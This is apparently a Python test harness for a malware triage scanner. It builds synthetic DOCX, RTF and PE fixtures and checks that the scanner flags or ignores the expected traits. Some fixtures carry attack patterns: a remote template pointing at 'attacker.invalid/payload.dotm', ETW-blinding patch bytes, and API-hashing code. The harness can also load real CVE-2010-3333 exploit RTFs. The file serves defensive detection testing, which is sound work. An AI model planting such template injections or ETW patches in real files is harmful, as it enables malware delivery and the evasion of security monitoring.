#!/usr/bin/env python3
"""Exercise RTF triage boundaries without running any specimen code."""
import argparse
import io
import json
from pathlib import Path
import struct
import subprocess
import tempfile
import zipfile

ROOT = Path(__file__).resolve().parents[2]
DENSE = 'objectives/anti-static/obfuscation/string/reconstruct/indexed::dense-comma-operator-string-pairs'
HASKELL = 'metadata/lang/source/language::haskell-language-source'
TEMPLATE = 'metadata/document/office/external-link::ooxml-external-content-reference'
HFS = 'metadata/document/office/external-link::ooxml-classic-mac-local-target'
HEADER = 'metadata/document/rtf/structure::rtf-malformed-header-invalid-tag'
OLD_HEADER = 'objectives/anti-static/obfuscation/document/rtf::rtf-malformed-header-invalid-tag'
FNV = 'objectives/anti-static/obfuscation/imports/api-hashing::fnv1a-api-resolution'
ETW = 'objectives/evasion/anti-av/blinding::native-etw-memory-blinding'
PDB = 'metadata/binary/debug::encrypt-pdb-artifact'
RANSOM_WORDING = 'metadata/lang/natural/phrasing/security::attacked-by-ransomware-wording'
RC4 = 'well-known/malware/exploit/cve-2010-3333::rc4-cve-key-pfragments-payload'


def docx(target):
    out = io.BytesIO()
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml', '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
        z.writestr('word/document.xml', '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>')
        z.writestr('word/_rels/settings.xml.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="' + target + '" TargetMode="External"/></Relationships>')
    return out.getvalue()


def pe(code=b'\xc3', payload=b'', imports=(), x64=False, pdb=None):
    """Non-running PE with explicit code/data/import sections for static checks."""
    data = bytearray(32768)
    data[:2] = b'MZ'
    struct.pack_into('<I', data, 60, 0x80)
    data[0x80:0x84] = b'PE\0\0'
    optsize = 240 if x64 else 224
    struct.pack_into('<HH', data, 0x84, 0x8664 if x64 else 0x14c, 3)
    struct.pack_into('<HH', data, 0x94, optsize, 0x22 if x64 else 0x102)
    opt = 0x98
    struct.pack_into('<H', data, opt, 0x20b if x64 else 0x10b)
    struct.pack_into('<II', data, opt+16, 0x1000, 0x1000)
    if x64:
        struct.pack_into('<Q', data, opt+24, 0x140000000)
    else:
        struct.pack_into('<II', data, opt+24, 0x6000, 0x400000)
    struct.pack_into('<II', data, opt+32, 0x1000, 0x200)
    struct.pack_into('<II', data, opt+56, 0x9000, 0x200)
    struct.pack_into('<H', data, opt+68, 3)
    dirs = opt + (112 if x64 else 96)
    struct.pack_into('<I', data, dirs-4, 16)
    for i, (name, rva, off, size, flags) in enumerate([
        (b'.text', 0x1000, 512, 16384, 0x60000020),
        (b'.rdata', 0x6000, 16896, 8192, 0x40000040),
        (b'.idata', 0x8000, 25088, 4096, 0xc0000040),
    ]):
        at = opt + optsize + i*40
        data[at:at+8] = name.ljust(8, b'\0')
        struct.pack_into('<IIII', data, at+8, size, rva, size, off)
        struct.pack_into('<I', data, at+36, flags)
    data[512:512+len(code)] = code
    data[17408:17408+len(payload)] = payload
    if imports:
        base = 25088
        width = 8 if x64 else 4
        fmt = '<Q' if x64 else '<I'
        thunk = base+256
        names = base+512
        data[names:names+13] = b'kernel32.dll\0'
        cursor = names+32
        for i, name in enumerate(imports):
            raw = name.encode()+b'\0'
            struct.pack_into(fmt, data, thunk+i*width, 0x8000+cursor-base)
            data[cursor:cursor+2] = b'\0\0'
            data[cursor+2:cursor+2+len(raw)] = raw
            cursor += 2+len(raw)+(len(raw)%2)
        struct.pack_into('<IIIII', data, base, 0x8100, 0, 0, 0x8200, 0x8100)
        struct.pack_into('<II', data, dirs+8, 0x8000, 40)
    if pdb:
        cv = b'RSDS'+bytes(16)+struct.pack('<I', 1)+b'C:\\build\\'+pdb.encode()+b'.pdb\0'
        struct.pack_into('<II', data, dirs+6*8, 0x6000, 28)
        struct.pack_into('<IIHHIIII', data, 16896, 0, 1, 0, 0, 2, len(cv), 0x6020, 16928)
        data[16928:16928+len(cv)] = cv
    return data


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--cleave', default='../cleave/target/release/cleave')
    ap.add_argument('--samples', type=Path, help='Optional extracted LibreOffice RTF corpus')
    args = ap.parse_args()
    fixtures = {}
    checks = {}

    def add(name, data, required=(), forbidden=(), severe=None):
        fixtures[name] = data.encode() if isinstance(data, str) else data
        checks[name] = (set(required), set(forbidden), severe)

    pairs = ','.join(f'("a{i}","b{i}")' for i in range(14))
    add('comma-expressions.js', 'const a=['+pairs+']; console.log(a);\n', [DENSE], [HASKELL])
    hs = 'module Example (values) where\nimport qualified Data.Map as M\nvalues = M.fromList ['+pairs+']\n'
    add('Lookup.hs', hs, [HASKELL], [DENSE], set())
    add('renamed-haskell.js', hs, [HASKELL], [DENSE], set())
    add('haskell-name-only.js', 'const a=['+pairs+']; // Lookup.hs\n', [DENSE], [HASKELL])
    add('mac-template.docx', docx('Macintosh%20HD:Users:alice:Library:Templates:Report.dotx'), [HFS], [TEMPLATE], set())
    add('other-volume.docx', docx('Work:Users:bob:Templates:Report.dotx'), [HFS], [TEMPLATE], set())
    add('remote-template.docx', docx('https://attacker.invalid/payload.dotm'), [TEMPLATE], [HFS])
    add('network-file-template.docx', docx('file://server/share/payload.dotm'), [TEMPLATE], [HFS])
    add('local-file-template.docx', docx('file:///C:/Users/alice/Templates/Report.dotx'), forbidden=[TEMPLATE], severe=set())
    add('versionless-fragment.rtf', r'{\rtf{\fonttbl{\f0 Arial;}}\pard test\par}', [HEADER], [OLD_HEADER], set())
    add('normal.rtf', r'{\rtf1\ansi ordinary document\par}', forbidden=[HEADER, OLD_HEADER], severe=set())
    add('compatible-versionless.rtf', r'{\rtf\ansi ordinary document\par}', forbidden=[HEADER, OLD_HEADER], severe=set())
    add('Encrypt.dll', pe(pdb='encrypt'), [PDB], ['well-known/malware/stealer/rusty-stealer::encrypt-pdb-artifact'], set())
    add('marketing.js', 'const message="Every ten seconds someone is attacked by ransomware";\n', [RANSOM_WORDING], ['objectives/impact/ransom/note::attacked-by-ransomware-claim'], set())
    hashcode = bytes.fromhex('b8 c5 9d 1c 81 69 c0 93 01 00 01')
    headerload = bytes.fromhex('8b 40 3c 8b 41 3c')
    add('near-hash-headers.exe', pe(hashcode+b'\x90'*8+headerload+b'\xc3'), [FNV])
    add('unrelated-hash-headers.exe', pe(hashcode+b'\x90'*2048+headerload+b'\xc3'), forbidden=[FNV], severe=set())
    etwdata = b'ntdll.dll\0EtwEventWrite\0'
    imps = ('GetProcAddress', 'VirtualProtect')
    add('etw-resolution-only.exe', pe(payload=etwdata, imports=imps, x64=True), forbidden=[ETW], severe=set())
    add('etw-return-patch.exe', pe(bytes.fromhex('c7 03 48 33 c0 c3 c3'), etwdata, imps, x64=True), [ETW])
    if args.samples:
        for name in ['CVE-2010-3333-1.rtf', 'CVE-pseudo-2009-0238-1.rtf']:
            raw = next(args.samples.rglob(name)).read_bytes()
            add('encoded-'+name, raw, [RC4], forbidden=['metadata/document/ole::ole-high-entropy'], severe={RC4, 'well-known/malware/exploit/cve-2010-3333::rc4-pfragments-overflow-body'})
        raw = bytearray(next(args.samples.rglob('CVE-2010-3333-1.rtf')).read_bytes())
        for offset in [0, 259, 1986]:
            changed = raw.copy()
            changed[offset] ^= 1
            add(f'broken-encoded-region-{offset}.rtf', changed, forbidden=[RC4])
    with tempfile.TemporaryDirectory(prefix='rtf-triage-controls-') as tmp:
        work = Path(tmp)
        for name, data in fixtures.items():
            (work/name).write_bytes(data)
        result = subprocess.run([str((ROOT/args.cleave).resolve()), '--traits-dir', str(ROOT), '--format', 'json', str(work)], text=True, capture_output=True, check=True)
        reports = [json.loads(line) for line in result.stdout.split('\n') if line.strip()]
        files = {Path(f['path']).name: f for report in reports for f in report['files']}
        for name, (required, forbidden, severe) in checks.items():
            traits = files[name].get('traits', [])
            ids = {t['id'] for t in traits}
            assert not required-ids, (name, 'missing', required-ids)
            assert not forbidden & ids, (name, 'unexpected', forbidden & ids)
            actual = {t['id'] for t in traits if t['crit'] >= 4}
            if name.startswith('encoded-'):
                assert any(t['id'] == RC4 and t['crit'] == 5 for t in traits), (name, 'missing hostile exploit finding')
            if severe is not None:
                assert actual == severe, (name, 'severity', actual, severe)
            print('PASS', name)
    print(f'{len(fixtures)} RTF triage controls passed')


if __name__ == '__main__':
    main()
